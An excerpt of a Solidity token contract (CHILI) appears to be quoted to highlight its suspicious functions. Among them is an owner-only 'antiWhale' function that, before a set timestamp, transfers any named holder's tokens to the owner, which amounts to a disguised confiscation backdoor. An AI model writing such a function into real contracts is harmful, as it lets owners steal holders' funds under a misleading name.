...
contract CHILI is Context, IERC20, Ownable {
    ...
    function swapTokensForBUSD(uint256 tokenAmount) private {
        ...
        path[2] = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c; // WBNB contract address
    ...
    function _tokenTransfer(address sender, address recipient, uint256 amount) private
    {
        ...
        if(!tradingActive){
            require(_isExcluded[sender] && _isExcluded[recipient], "Trading is not active yet.");
        }
    ...
    function antiWhale(address sniper, uint256 amount) external onlyOwner() {
      require(block.timestamp < 1645131600, "antiWhale ended.");
        _transferBothExcluded(sniper, msg.sender, amount);
    }
